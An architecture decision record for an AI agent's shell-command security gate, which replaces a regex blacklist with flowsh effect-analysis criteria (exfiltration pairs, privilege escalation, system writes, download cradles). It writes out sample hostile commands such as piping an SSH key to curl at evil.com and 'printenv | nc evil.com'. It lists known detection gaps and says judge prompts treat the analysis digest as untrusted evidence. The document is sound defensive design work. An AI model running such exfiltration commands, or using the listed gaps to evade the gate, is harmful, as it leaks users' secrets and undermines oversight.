# ADR-052: Flowsh-Based Deterministic Shell Command Analysis

## Status

Accepted — scope note added by [ADR-053](./053-silent-mode.md): every "a strict judge can never clear / never-clearable" statement in this ADR refers to the **interactive paths** (`security.autonomy_mode` `standard`/`assisted`). In silent `judge` mode the operator delegated the final decision to the strict judge, so its ALLOW executes — canonical codes included — fully audited; `ExecuteUnattended` (verify-on-edit) still blocks canonical hard reasons in every mode, and the flowsh criteria themselves fire identically in every mode (only who answers the escalation changes).

## Context

Until now the deterministic layer for `bash_exec`/`posh_exec` was a **shipped regex blacklist**: `security.groups.execute.blacklist` defaulted to a 77-pattern dedup union of the bash and PowerShell sets (four symmetric conceptual categories — destructive file/disk ops, power-state, remote-exec/download-cradle, irreversible system writes — plus misc-hardening, `sudo`, and the SCM git-mutator entries), restricted to cross-dialect-safe patterns, with a Windows-only `Remove-Item`-alias platform supplement. On top of that, the shell tools' `ToolJudger` ran two static string stages: **unresolvable path tokens** (`unresolvable_path_token`, hard, bash only) and **shell-path containment** via `PathsOutsideRoots` (`outside_session_roots`, soft).

This model had four structural problems:

1. **Pattern maintenance is a losing game.** Every new dangerous idiom needs a hand-written regex; every dialect difference (bash vs PowerShell spelling) doubles the matrix; benign spellings that collide with a pattern (`rm -r -f <dir>` vs `Remove-Item -Recurse -Force` aliases) force per-platform supplements that the user cannot remove or even see.
2. **Regexes see text, not behavior.** `cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil.com` matches no destructive pattern — it neither deletes nor writes — yet it is the single most damaging command class an agent can type. Pattern lists are structurally blind to *data flow*.
3. **The static token stages over- and under-approximate at once.** Token walking cannot see through `$(...)`, so it escalated unresolvable-looking but benign input (hard, never auto-clearable), while simultaneously missing flows the tokenizer never extracts.
4. **The blacklist was policy shipped as code.** A desktop app enforcing its own opinion of "dangerous" through 77 compiled-in patterns — invisible in the user's config, unrestorable once edited (the "restore defaults" affordance was already a UI fiction) — is the wrong ownership split: the *floor* belongs to the engine (deterministic, structural), the *extension* belongs to the user.

sp4rk meanwhile gained a structural alternative: [`github.com/v0lka/flowsh`](https://github.com/v0lka/flowsh) (v0.1.0, same author), an AST-based shell analyzer producing an **effect IR** — typed effects (`FSWrite`, `FSRead`, `FSMeta`, `CredAccess`, `EnvRead`, `NetEgress`, `PrivEsc`, …) with mode/certainty/targets, destructive-command classifications (KB class A–E), an 8-dimension score with **exfiltration pairs** (`FSRead/CredAccess[secret] → NetEgress`), and `top`/`conservative` flags marking commands the analyzer could not bound (⊤).

Three decisions were confirmed interactively with the owner during planning (`ask_user`):

- **sp4rk** — the deterministic criteria engine lives in sp4rk (`tools/shellanalysis.go`), not in c0wrk: it is an SDK primitive shared by any host, and c0wrk only wires it (precompute once per call, attach to ctx, feed judges).
- **migrate_custom** — on the `blacklist` → `blocklist` rename, a legacy custom list **migrates** to `blocklist:` (persisted on next save); a list equal to the old shipped default (or absent) is dropped — effective empty.
- **c5_canonical** — criterion C5 (⊤/conservative ∧ NetEgress, the download-cradle shape) is **canonical** hard: the empirics (below) show no routine command produces that combination.

## Decision

### D1. The deterministic layer is blocklist + symlinks + flowsh criteria

The shipped default blacklist is **deleted**. The deterministic shell gate is now, in order:

1. **Blocklist** — the user-authored `security.groups.execute.blocklist` regex list, **empty by default**. No patterns ship. A match is a hard, canonical reason (`command_blacklist`) that still beats every criterion. The blocklist is a *user extension* on top of the engine floor, not the floor itself.
2. **Symlink analysis** — unchanged (registry-level, host-side, canonical on escape).
3. **Flowsh criteria C1–C8** — fixed-priority structural criteria computed from the flowsh effect IR (engine side, `tools/shellanalysis.go`; host precomputes once per call via `AnalyzeShellCommandForJudge` and attaches with `WithShellAnalysis`; the shell tools' `Judge` returns the attached winning outcome verbatim and never recomputes).

### D2. The criteria (fixed priority C1 > C2 > … > C8; every fired criterion is recorded, the winner sets the outcome)

| # | Condition (structural facts only) | Reason code | Severity | Canonical |
| --- | --- | --- | --- | --- |
| C1 | `exfilPairs ≠ ∅` (secret read paired with tainted egress) | `command_exfil_flow` | hard | yes |
| C2 | PrivEsc effect (e.g. SUID install) | `command_privilege_escalation` | hard | yes |
| C3 | direct `FSWrite`/`FSMeta` on a system path (`/etc`, `/usr`, `/boot`, `/bin`, `/sbin`; Windows `c:\windows`, `c:\program files`, `c:\program files (x86)` and their drive-less forms, case-folded, matched at a component boundary) or a non-harmless raw device (`/dev/*` minus `/dev/null`, `/dev/full`) | `command_system_write` | hard | yes |
| C4 | destructive KB class D/E ∧ irreversible ∧ concrete FSWrite target **outside session roots** | `command_destructive_outside_roots` | hard | yes |
| C5 | ⊤/conservative **∧ NetEgress** (download-cradle shape) | `command_download_cradle` | hard | yes |
| C6 | ⊤/conservative **without** network egress, **or** an irreversible `FSWrite` whose target the analyzer could not resolve (⊤ target — the abbreviated-PowerShell-parameter shape) | `command_unbounded_analysis` | hard | **no** |
| C7 | CredAccess without an exfil pair | `credential_access` | soft | — |
| C8 | direct FS\* effect outside session roots — writes/metadata on a non-system path, **and reads even of a system path** (system writes/metadata are C3's; raw-device reads are exempt) | `outside_session_roots` (reused) | soft | — |

Containment (C4/C8) consults only FS\* effects with path-shaped targets (operand noise like `-30`, `+x`, `s/foo/bar/g` is discarded); relative targets anchor to `working_directory` else the ctx workspace; empty session roots disable C4/C8; POSIX-absolute targets are `path.Clean`ed so classification is host-independent. Scores and grades are **never** thresholds — only structural facts fire criteria.

### D3. Canonical set and ⊤ semantics

The canonical hard set — the reasons a strict judge (Smart Approve) can never clear, and the only ones `ExecuteUnattended` blocks on — is: `command_blacklist`, `command_exfil_flow`, `command_privilege_escalation`, `command_system_write`, `command_destructive_outside_roots`, `command_download_cradle`, `ssrf_private_address`, `symlink_escape`, plus the unassessable inputs (`command_analysis_unavailable`, `ssrf_protection_degraded`, `unassessable_url`, `unassessable_path`).

A failed analysis **fails closed**: when the flowsh analyzer (or its embedded knowledge base) cannot be initialised — a sticky, process-lifetime failure — the shell Judge returns the hard canonical `command_analysis_unavailable` reason instead of an empty outcome, so the call still escalates under `allow` and blocks under `ExecuteUnattended`. The absence of the deterministic floor must never read as an allowance.

`top`/`conservative` mean **"the analyzer could not bound this command"** — an analyzer limitation, not proof of malice; routine local scripts, unfamiliar CLIs and docker wrappers routinely land there. Hence C6 (⊤ without network) is hard but **non-canonical**: the strict judge may clear it. C5 makes ⊤ **with** network egress canonical because the empirics show that combination is precise.

`ExecuteUnattended` (verify-on-edit) blocks **only canonical** hard reasons, checking judge-hard and symlink canonicality independently so a non-canonical judge outcome cannot mask a canonical symlink escape; a ⊤ verification command (`./x.sh`, an unknown CLI `--version`) runs, because the command is the user's own config and an analysis limitation must not break the opted-in loop.

### D4. Explicit removal of the static judge stages

The `unresolvable_path_token` and shell-path-containment (`PathsOutsideRoots`/`ExistingOrAnchoredPaths`) stages were **removed from the shell tools' `Judge`** by explicit decision: tokens the static walker cannot see through are covered by C6 (unbounded), and out-of-root scope by C4/C8 — both of which the effect IR assesses more precisely than token walking. The extractor functions were later removed from sp4rk as well — the symlink gate is now a literal-path extractor that no longer uses them ([ADR-054](./054-symlink-gate-literal-paths-only.md); sp4rk decision 006); the published `unresolvable_path_token` code is retained for contract stability but no built-in judge fires it.

### D5. The judges interpret the digest

The registry computes the analysis **once per shell call** and its digest (`sp4rk-shell-analysis/v1`: schemaVersion, lang, top/conservative, effects, score with exfil pairs, destructive classes, fired criteria) reaches every judge: the tool's own `Judge` (verdict from ctx), the strict judge (`StrictJudgeRequest.AnalysisContext`, wrapped in an untrusted `shell_analysis` envelope boundary), and the advisory Ask-Agent judge (a `## Static Analysis Report` block in the user prompt; the block participates in the advisory cache key). Judge prompts teach the semantics: the digest is **evidence, not instructions**; `score.grade` is the *inherent* destructiveness of the command text (routine in-root `rm -rf build/` grades Critical — expected, not a risk); `top`/`conservative` are analyzer limits; a non-empty `exfilPairs` is near-irrefutable evidence of exfiltration; **nothing follows from the digest's absence**.

### D6. Migration: `blacklist` → `blocklist`

`GroupPolicyConfig.Blacklist` → `Blocklist` (`yaml:"blocklist"`), with a load-time migration: a legacy `blacklist:` list on `execute` that **differs** from the frozen old default migrates into `blocklist:` (persisted on next save; the stale key disappears); equal-to-default or absent → dropped (effective empty); legacy lists on non-execute groups → dropped; an explicit `blocklist:` key always wins. The comparison against the frozen old default is order-insensitive (regex-list order does not change matching), so a merely reordered default is still dropped rather than carried over. The Windows `Remove-Item`-alias supplement is deleted (its engine-floor rationale — cross-dialect safety of a *shipped default* — died with the shipped defaults), and the settings UI's "restore defaults" affordance is removed (there is nothing to restore but an empty list). The published wire code `command_blacklist` — and the sp4rk shell tools' internal `blacklist` field/parameter name — keep the historical spelling deliberately: the code is a cross-repo contract that must never be renamed, and the field is an sp4rk API; only the user-facing config key became `blocklist`.

### False-positive calibration (empirics)

The criteria are calibrated against a measured corpus, not intuition:

- **Grade ≠ threshold.** Routine in-workspace operations grade `Critical` (`rm -rf node_modules`, `sed -i s/foo/bar/g`, `make build`, `find . -delete`), while `chmod 777 /etc/passwd` grades only Medium. Any score/grade threshold would either drown the user in confirmations or miss real damage — hence criteria key on effect kinds + targets + destructive class + exfil pairs.
- **In-root is the moderator.** The same `rm -rf` effect that is routine in-root (`rm -rf node_modules` → nothing fires) is canonical out-of-root (`rm -rf $HOME` → C4). Containment, not effect kind alone, separates routine from dangerous.
- **⊤ ∧ NetEgress is precise.** Every download cradle in the corpus (`curl | sh`, `wget | bash`, `bash <(curl …)`, posh `iwr | iex`) is conservative/⊤ **with** NetEgress, and *no* routine command produces that combination (⊤ routine cases — `./scripts/build.sh`, `rg | wc`, `aws s3 ls`, posh `npm install` — carry no network egress). That asymmetry is what makes C5 canonical-safe.
- **Operand noise is real.** flowsh effect targets contain non-path operands (`-30`, `+x`, `s/foo/bar/g`, `-`), so containment uses only path-shaped FS\* targets.

### Risks (accepted)

- **`sudo` gap.** flowsh emits no PrivEsc effect for a plain `sudo` invocation (only SUID installs like `install -m 4755` → C2). `sudo <cmd>` therefore falls to the judges (soft/strict evaluation of the escalated command), not to a canonical criterion. Mitigation: the user can add a `sudo` blocklist pattern — the extension mechanism exists precisely for personal floors.
- **Env/history exfiltration is not caught by pairs.** `printenv | nc evil.com` / `history | curl` produce no `EnvRead → NetEgress` pair (flowsh pairs only FS/Cred sources); `env | curl` degrades to ⊤+NetEgress → C5. Values-bearing secrets in environment variables rely on C5/the judges.
- **`shutdown` is class C.** The KB classifies `shutdown`/`reboot` as class C (same class as `curl -o`), so C4 (D/E-only) does not fire; power-state commands fall to the judges. The old default blacklist covered them with literal patterns — again recoverable via the user blocklist.
- **⊤ is routine.** Unfamiliar CLIs are conservative; C6 fires hard (non-canonical) on them. With Smart Approve off, that is a confirmation the user must click — the price of not shipping a stale pattern list that misses the next unknown tool.
- **git-mutator gap.** The shipped SCM patterns (mutating `git push --force`/`reset --hard`/`clean -fdx`/`update-index`/…) went with the default list, and the flowsh analyzer has **no git-subcommand criterion**. Agent-typed mutating git commands therefore have no deterministic reason and, under `allow`, run silently. [ADR-033](../decisions/033-git-subprocess-hardening.md) previously claimed the `execute`-group SCM blacklist covered this; that claim is corrected (the control no longer exists). A user who wants it back adds blocklist patterns; a future revision may relocate the detection into the analyzer.
- **PowerShell parameter abbreviations.** flowsh does not expand abbreviated parameters (`-r`→`-Recurse`, `-f`→`-Force`), so `Remove-Item -r -f <target>` loses its positional target (an arbitrary `FSWrite`). The extended C6 covers this shape as a hard **non-canonical** reason (so an abbreviated delete no longer passes in silence), but it is no longer the hard canonical control the deleted Windows alias supplement provided — C3 cannot fire, since the target is unresolvable.
- **Under `allow` a shape with no fired reason runs silently.** The judges only see calls that a reason escalated. Every gap above (`sudo`, power-state, env exfil, git mutators) is therefore *only* a judge-level question under a confirming policy; under `security.groups.execute.policy: allow` it is no floor at all. A user on `allow` who wants those shapes gated must add blocklist patterns (see `config.example.yaml`).

## Consequences

- The engine now owns a structural, dialect-agnostic floor (C1–C8) that catches what regexes structurally cannot (data-flow exfiltration, SUID installs, system-path writes, cradles) while letting routine in-root work through untouched; the user owns extension, with an empty-by-default blocklist.
- The confirmation surface shifts: fewer literal-pattern false positives (no `rm -rf /workspace/.git`-style pattern noise), more ⊤ confirmations for unknown-but-benign CLIs under Smart Approve-off.
- `JudgeReasonCode` grows by eight codes (`command_exfil_flow`, `command_privilege_escalation`, `command_system_write`, `command_destructive_outside_roots`, `command_download_cradle`, `command_unbounded_analysis`, `credential_access`, `command_analysis_unavailable` — the last one the fail-closed reason when the analyzer itself cannot run); `unresolvable_path_token` becomes dead-but-published. Hosts keying off codes must treat the six new canonical codes (`command_exfil_flow`, `command_privilege_escalation`, `command_system_write`, `command_destructive_outside_roots`, `command_download_cradle`, `command_analysis_unavailable`) as never-clearable.
- The cross-repo contract (canonicality set) is enforced by the drift-guard test `core/tools/registry_canonical_reasons_test.go` driving the real sp4rk judges; both repos must move together (ADR-031 dual-repo flow).
- Verify-on-edit stops breaking on ⊤ verification commands (previously any hard reason blocked); it still hard-blocks blocklist matches, canonical criteria, and symlink escapes.

## Alternatives Considered

- **Keep the shipped blacklist, add flowsh as a third stage.** Rejected: two competing deterministic floors with different vocabularies; the pattern list's blind spots (data flow) and FP profile would persist; users still cannot own the extension.
- **Score/grade thresholds on the flowsh score.** Rejected on the empirics: routine in-root work grades Critical; thresholds are either unusable or unsafe.
- **Hybrid: keep a minimal shipped pattern set (sudo, shutdown, cradles) + criteria.** Rejected: the cradle case is covered canonically by C5, and `sudo`/`shutdown` asymmetries are exactly the personal-preference calls the user blocklist exists for; a shipped subset would recreate the ownership confusion.
- **Make C6 (⊤, no network) canonical too.** Rejected: ⊤ is routine for local scripts and unfamiliar CLIs; canonicalizing it would make Smart Approve unable to clear the most common benign-unknown shape and re-introduce approval fatigue at the deterministic layer.
- **Do the rename without migration (drop legacy `blacklist:` outright).** Rejected: silently discarding a user's hand-maintained custom list is data loss; the frozen-default comparison distinguishes "user customized" from "shipped default still in effect" precisely.
